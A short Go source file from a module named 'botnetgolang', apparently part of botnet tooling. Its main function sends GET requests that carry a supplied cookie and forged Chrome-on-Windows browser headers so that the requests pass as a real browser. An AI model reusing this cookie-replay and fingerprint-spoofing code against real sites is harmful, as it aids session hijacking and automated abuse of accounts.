package pkg

import (
	"botnetgolang/internal/model"
	"fmt"
	"io/ioutil"
	"net/http"
)

func isWin64String(isWin64 bool) string {
	if isWin64 {
		return "Win64"
	}
	return "Win32"
}

func isWinx64(isWin64 bool) string {
	if isWin64 {
		return "x64"
	}
	return "x86"
}

func RequestElectP(url string,
	chromeV string,
	huy2 string,
	osType string,
	osR string,
	version string,
	browser model.BrowserPaths,
	isWin64 bool,
) (string, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Failed to create request:", err)
		return "", err
	}
	req.Header.Add("accept", "text/html;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("cookie", huy2)
	req.Header.Add("sec-ch-prefers-color-scheme", "light")
	req.Header.Add("sec-ch-ua", fmt.Sprintf(`Not?A_Brand";v="8", "Chromium";v="%s", "%s";v="%s"`, chromeV, browser.ProductName, chromeV))
	req.Header.Add("sec-ch-ua-mobile", "?0")
	req.Header.Add("sec-ch-ua-platform", "Windows")
	req.Header.Add("sec-fetch-dest", "document")
	req.Header.Add("sec-fetch-mode", "navigate")
	req.Header.Add("sec-fetch-site", "same-origin")
	req.Header.Add("sec-fetch-user", "?1")
	req.Header.Add("upgrade-insecure-requests", "1")
	req.Header.Add("User-Agent", fmt.Sprintf(`Mozilla/5.0 (%s %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s Safari/537.36`, osType, osR, isWin64String(isWin64), isWin64String(isWin64), browser.Name, version))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Failed to send request:", err)
		return "", err
	}
	defer resp.Body.Close()

	// Đọc response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Failed to read response body:", err)
		return "", err
	}

	return string(body), nil

}
